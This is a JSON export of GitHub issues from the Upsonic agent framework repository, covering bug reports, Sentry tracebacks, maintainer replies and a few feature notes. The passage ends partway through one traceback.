+      "body": "**Describe the bug**\nsend request to web api as example in document hang forever:\n\n```python\nfrom fastapi import FastAPI\nfrom upsonic import Agent, Task\nfrom upsonic.client.tools import Search\n\napp = FastAPI()\n\n\nagent = Agent(\n    \"Customer Support\",\n    company_url=\"https://your-company.com\",\n    company_objective=\"To provide excellent customer service and support\",\n)\n\n@app.get(\"/ask\")\nasync def ask(query: str):\n\n    task = Task(query, tools=[Search])\n    \n\n    response = agent.do(task)\n    \n    return {\"response\": response}\n```\n\n\n\n**Screenshots**\nhang like this:\n\n![Image](https://github.com/user-attachments/assets/1b142108-daef-4da8-a53a-4661a40909bb)\n\n**Desktop (please complete the following information):**\n - OS: [macOS 13]\n - Upsonic Version [0.49.0]\n- Python Version [3.12]\n\n\n",
+      "state": "open",
+      "author": "gaord",
+      "author_type": "User",
+      "created_at": "2025-03-24T15:47:16Z",
+      "updated_at": "2025-04-03T12:32:02Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 4,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/304/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/304",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/304",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.000611",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hey it seems working right now. Can you try with our latest version:\n\nhttps://github.com/Upsonic/Upsonic/releases/tag/v0.50.5",
+          "created_at": "2025-04-02T12:30:53Z"
+        },
+        {
+          "author": "gaord",
+          "body": "just checked, not fixed yet. Anyway the following code change can work to fix the hang:\n\n    response = await asyncio.wait_for(\n        asyncio.to_thread(lambda: agent.do(task)),\n        timeout=60.0  # 30 seconds timeout\n    )   \n\nhope it helps",
+          "created_at": "2025-04-03T11:01:14Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Okkkey, ı found it.\n\n\nWe need to run do_async and await at async fastapi servers. The problem is our default approach. Our defaults are base on sync calls. I will think about it.\n\n\n```python\nfrom fastapi import FastAPI\nfrom upsonic import Agent, Task\nfrom upsonic.client.tools import Search\n\napp = Fa",
+          "created_at": "2025-04-03T12:21:04Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Can you verify?",
+          "created_at": "2025-04-03T12:21:18Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 318,
+      "title": "InvalidRequestException: Error processing Agent request: Error code: 400 - {'error': {'message': \"An assistant message with 'tool_calls' must be followed by tool messages responding to each 'tool_call_id'. The following tool_call_ids did not have response messages: call_xrEZq9F...",
+      "body": "Sentry Issue: [UPSONIC-XY](https://upsonic.sentry.io/issues/6457438523/?referrer=github_integration)\n\n```\nInvalidRequestException: Error processing Agent request: Error code: 400 - {'error': {'message': \"An assistant message with 'tool_calls' must be followed by tool messages responding to each 'tool_call_id'. The following tool_call_ids did not have response messages: call_xrEZq9FSbLsaVp0ax6DaIiCc, call_Yko1cFvO4RIj7lgOPbSieei4, call_bvXcvcenvJ3yCfNnQHpAIhd3\", 'type': 'invalid_request_error', 'param': 'messages.[3].role', 'code': None}}\n(4 additional frame(s) were not displayed)\n...\n  File \"test.py\", line 43, in <module>\n    code_review_result = code_review_agent.do(review_task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-04-03T10:12:31Z",
+      "updated_at": "2025-04-03T12:04:16Z",
+      "closed_at": "2025-04-03T12:04:16Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/318/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/318",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/318",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.231105",
+      "comments": []
+    },
+    {
+      "issue_number": 317,
+      "title": "[BUG] CallErrorException {'status_code': 500, 'detail': \"Error processing Call request in OpenAIModel.__init__() got an unexpected keyword argument 'base_url'\"}",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-04-03T09:28:53Z",
+      "updated_at": "2025-04-03T09:29:11Z",
+      "closed_at": "2025-04-03T09:29:10Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/317/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/317",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/317",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.231135",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Fixed with https://github.com/Upsonic/Upsonic/releases/tag/v0.51.0",
+          "created_at": "2025-04-03T09:29:10Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 296,
+      "title": "[BUG]",
+      "body": "**Describe the bug**\nhttpx.HTTPStatusError: Server error '500 Internal Server Error' for url 'http://localhost:7541/level_one/gpt4o'\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\nfrom upsonic import Task, Agent\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\nos.environ[\"OPENAI_API_KEY\"]  = os.getenv(\"OPENAI_API_KEY\")\n\ntask = Task(\"Who developed you?\")\nagent = Agent(\"Coder\")\nagent.print_do(task)\n```\n\n\n4. See error\n\n\n\n**Desktop (please complete the following information):**\n - OS: Windows\n - Upsonic Version 0.49.0\n- Python Version 3.12\n\n\n**Additional context**\nFull error message:\nTraceback (most recent call last):\n  File \"...\\agent_upsonic01.py\", line 12, in <module> \n    agent.print_do(task)\n  File \"..\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 228, in print_do \n    return asyncio.run(self.print_do_async(task))\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\asyncio\\runners.py\", line 194, in run \n    return runner.run(main)\n           ^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\asyncio\\runners.py\", line 118, in run \n    return self._loop.run_until_complete(task)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\asyncio\\base_events.py\", line 664, in run_until_complete \n    return future.result()\n           ^^^^^^^^^^^^^^^\n  File \"...\\rr\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 232, in print_do_async \n    result = await self.do_async(task)\n             ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\rr\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 208, in do_async \n    return await execute_task_async(self, task, self.debug)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\rr\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\agent_configuration\\agent_configuration.py\", line 112, in execute_task_async \n    await the_client.run_async(agent_config, task)\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\base.py\", line 255, in run_async \n    return await self.agent_async(args[0], args[1])\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\level_two\\agent.py\", line 317, in agent_async \n    the_characterization = await self.create_characterization_async(agent_configuration, llm_model, task.price_id)\n                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\level_two\\agent.py\", line 616, in create_characterization_async \n    await self.call_async(human_objective_task, llm_model=llm_model)\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\level_one\\call.py\", line 139, in call_async \n    raise outer_e\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\level_one\\call.py\", line 129, in call_async \n    the_result = await self.call_async_(task, llm_model)\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\level_one\\call.py\", line 192, in call_async_ \n    result = await self.send_request_async(\"/level_one/gpt4o\", data)\n             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\upsonic\\client\\base.py\", line 221, in send_request_async \n    response.raise_for_status()\n  File \"...\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\httpx\\_models.py\", line 829, in raise_for_status \n    raise HTTPStatusError(message, request=request, response=self)\nhttpx.HTTPStatusError: Server error '500 Internal Server Error' for url 'http://localhost:7541/level_one/gpt4o'\nFor more information check: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/500\nSentry is attempting to send 3 pending events\nWaiting up to 2 seconds\nPress Ctrl-Break to quit\n\nProcess finished with exit code 1\n",
+      "state": "closed",
+      "author": "rracinskij",
+      "author_type": "User",
+      "created_at": "2025-03-22T17:33:59Z",
+      "updated_at": "2025-04-02T19:20:22Z",
+      "closed_at": "2025-04-02T19:20:21Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/296/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/296",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/296",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.532431",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Can you try our fixed version:\n\nhttps://github.com/Upsonic/Upsonic/releases/tag/v0.50.5",
+          "created_at": "2025-04-02T15:36:51Z"
+        },
+        {
+          "author": "rracinskij",
+          "body": "Now it works, thank you!",
+          "created_at": "2025-04-02T19:20:21Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 314,
+      "title": "[BUG] AttributeError: 'HumanObjective' object has no attribute 'job_title'",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-28T02:41:51Z",
+      "updated_at": "2025-03-28T02:42:58Z",
+      "closed_at": "2025-03-28T02:42:58Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/314/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/314",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/314",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751908",
+      "comments": []
+    },
+    {
+      "issue_number": 273,
+      "title": "InvalidRequestException: Error processing Agent request: Error code: 400 - {'message': \"messages.2: the following `tool_use` ids were not found in `tool_result` blocks: {'toolu_bdrk_018ztN8dkWrp8u3FZTwdUF9G'}\"}",
+      "body": "Sentry Issue: [UPSONIC-M7](https://upsonic.sentry.io/issues/6389554427/?referrer=github_integration)\n\n```\nInvalidRequestException: Error processing Agent request: Error code: 400 - {'message': \"messages.2: the following `tool_use` ids were not found in `tool_result` blocks: {'toolu_bdrk_018ztN8dkWrp8u3FZTwdUF9G'}\"}\n(9 additional frame(s) were not displayed)\n...\n  File \"upsonic/client/level_two/agent.py\", line 395, in agent_async\n    result = await self.agent_async_(task_specific_configs[i], each, llm_model=llm_model)\n  File \"upsonic/client/level_two/agent.py\", line 461, in agent_async_\n    raise outer_e\n  File \"upsonic/client/level_two/agent.py\", line 448, in agent_async_\n    the_result = await self.send_agent_request_async(agent_configuration, task, llm_model)\n  File \"upsonic/client/level_two/agent.py\", line 531, in send_agent_request_async\n    error_handler(result)\n  File \"upsonic/client/level_utilized/utility.py\", line 121, in error_handler\n    raise InvalidRequestException(result[\"detail\"])\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:19:23Z",
+      "updated_at": "2025-03-27T19:07:26Z",
+      "closed_at": "2025-03-27T19:07:26Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/273/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/273",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/273",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751930",
+      "comments": []
+    },
+    {
+      "issue_number": 272,
+      "title": "InvalidRequestException: Error processing Agent request: Error code: 400 - {'error': {'message': \"An assistant message with 'tool_calls' must be followed by tool messages responding to each 'tool_call_id'. The following tool_call_ids did not have response messages: call_vIVLloG...",
+      "body": "Sentry Issue: [UPSONIC-N4](https://upsonic.sentry.io/issues/6394689053/?referrer=github_integration)\n\n```\nInvalidRequestException: Error processing Agent request: Error code: 400 - {'error': {'message': \"An assistant message with 'tool_calls' must be followed by tool messages responding to each 'tool_call_id'. The following tool_call_ids did not have response messages: call_vIVLloGzNsdWx0J0jVwFRFdj, call_5fZH9BD8GZJJIpH55aKPpgha, call_fgY4NkhtQnxwWuDz2pt998la\", 'type': 'invalid_request_error', 'param': 'messages.[3].role', 'code': None}}\n(5 additional frame(s) were not displayed)\n...\n  File \"test.py\", line 40, in <module>\n    code_review_agent.print_do(review_task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:18:30Z",
+      "updated_at": "2025-03-27T19:07:23Z",
+      "closed_at": "2025-03-27T19:07:23Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/272/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/272",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/272",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751937",
+      "comments": []
+    },
+    {
+      "issue_number": 290,
+      "title": "HTTP error processing request: 408: Request timed out after 300 seconds",
+      "body": "Sentry Issue: [UPSONIC-TB](https://upsonic.sentry.io/issues/6434256800/?referrer=github_integration)\n\n```\nHTTP error processing request: 408: Request timed out after 300 seconds\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-22T00:04:04Z",
+      "updated_at": "2025-03-27T19:03:44Z",
+      "closed_at": "2025-03-27T19:03:44Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/290/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/290",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/290",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751944",
+      "comments": []
+    },
+    {
+      "issue_number": 312,
+      "title": "[BUG] Request timed out",
+      "body": "Sentry Issue: [UPSONIC-Z1](https://upsonic.sentry.io/issues/6467408789/?referrer=github_integration)\n\n```\nError in run_seo_agent: Request timed out\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-27T16:36:30Z",
+      "updated_at": "2025-03-27T19:00:29Z",
+      "closed_at": "2025-03-27T19:00:29Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/312/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/312",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/312",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751952",
+      "comments": []
+    },
+    {
+      "issue_number": 310,
+      "title": "[BUG] Streamlit cloud sqlite3.OperationalError",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-27T10:10:47Z",
+      "updated_at": "2025-03-27T10:16:35Z",
+      "closed_at": "2025-03-27T10:16:35Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/310/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/310",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/310",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751959",
+      "comments": []
+    },
+    {
+      "issue_number": 308,
+      "title": "[BUG] Doesn't work with streamlit",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-27T03:54:29Z",
+      "updated_at": "2025-03-27T03:58:37Z",
+      "closed_at": "2025-03-27T03:58:37Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/308/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/308",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/308",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751967",
+      "comments": []
+    },
+    {
+      "issue_number": 269,
+      "title": "[FEATURE] Canvas Feature",
+      "body": "**Is your feature request related to a problem? Please describe.**\nComing Soon\n\n**Describe the solution you'd like**\nComing Soon\n\n**Describe alternatives you've considered**\nComing Soon\n\n**Additional context**\nComing Soon\n",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-19T00:20:55Z",
+      "updated_at": "2025-03-25T12:04:40Z",
+      "closed_at": "2025-03-25T12:04:40Z",
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/269/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/269",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/269",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751974",
+      "comments": []
+    },
+    {
+      "issue_number": 302,
+      "title": "[FEATURE] Output Language Selection Task(lang=\"de\") or Agent(lang=\"de\")",
+      "body": "In next release",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-24T13:33:31Z",
+      "updated_at": "2025-03-24T23:28:21Z",
+      "closed_at": "2025-03-24T23:28:21Z",
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/302/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/302",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/302",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751981",
+      "comments": []
+    },
+    {
+      "issue_number": 303,
+      "title": "[FEATURE] Adding SSE MCP server support",
+      "body": "In next releae.",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2025-03-24T13:34:00Z",
+      "updated_at": "2025-03-24T23:19:02Z",
+      "closed_at": "2025-03-24T23:19:02Z",
+      "labels": [
+        "feature"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/303/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/303",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/303",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751988",
+      "comments": []
+    },
+    {
+      "issue_number": 281,
+      "title": "ModuleNotFoundError: No module named 'tenacity'",
+      "body": "Sentry Issue: [UPSONIC-KP](https://upsonic.sentry.io/issues/6384564032/?referrer=github_integration)\n\n```\nModuleNotFoundError: No module named 'tenacity'\n(10 additional frame(s) were not displayed)\n...\n  File \"main.py\", line 36, in <module>\n    agent.print_do(task1)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:25:42Z",
+      "updated_at": "2025-03-23T23:52:06Z",
+      "closed_at": "2025-03-23T23:52:05Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/281/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/281",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/281",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.751995",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi, thanks. Now we have the installation section for knowledge base in docs.\n\nhttps://docs.upsonic.ai/concepts/knowledge_base#installing-rag-library\n",
+          "created_at": "2025-03-23T23:52:05Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 300,
+      "title": "[BUG] Running \"uv add upsonic\" or \"pip install upsonic\" installs something else",
+      "body": "**Describe the bug**\nRunning \"uv add upsonic\" or \"pip install upsonic\" installs something else.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Run with this command\n```console\nuv add upsonic\n```\n1. Use this code:\n```python\nfrom upsonic.client.tasks.tasks import Task\n```\n\n4. See error\nModuleNotFoundError: No module named 'upsonic.client'\n\n**Expected behavior**\nIt runs without any issue\n\n\n**Screenshots**\nIf applicable, add screenshots to help explain your problem.\n\n**Desktop (please complete the following information):**\n - OS: MacOS\n - Upsonic Version: latest\n- Python Version 3.12.4\n\n\n**Additional context**\nnone.",
+      "state": "closed",
+      "author": "achieveramin",
+      "author_type": "User",
+      "created_at": "2025-03-23T11:27:54Z",
+      "updated_at": "2025-03-23T20:42:36Z",
+      "closed_at": "2025-03-23T20:42:35Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/300/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/300",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/300",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:52.951740",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "You should try:\n\n```python\nfrom upsonic import Task\n```",
+          "created_at": "2025-03-23T20:42:35Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 301,
+      "title": "[BUG] agent running ends up with exception of KeyboardInterrupt",
+      "body": "**Describe the bug**\nrunning cookbook investment_analyst ends up with exception. It looks like happening with the other examples as well.\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Run with this command:\n`python investment_analyst.py`\n\n2. agent running with progressing info, unexpectedly somehow it shows KeyboardInterrupt while no key pressed.\n\n\n4. See error\n\n`\nERROR:   Traceback (most recent call last):\n\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/runners.py\", line 195, in run\n    return runner.run(main)\n           ^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/runners.py\", line 118, in run\n    return self._loop.run_until_complete(task)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 678, in run_until_complete\n    self.run_forever()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 645, in run_forever\n    self._run_once()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 1961, in _run_once\n    event_list = self._selector.select(timeout)\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/selectors.py\", line 566, in select\n    kev_list = self._selector.control(None, max_ev, timeout)\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/upsonic/storage/configuration.py\", line 33, in 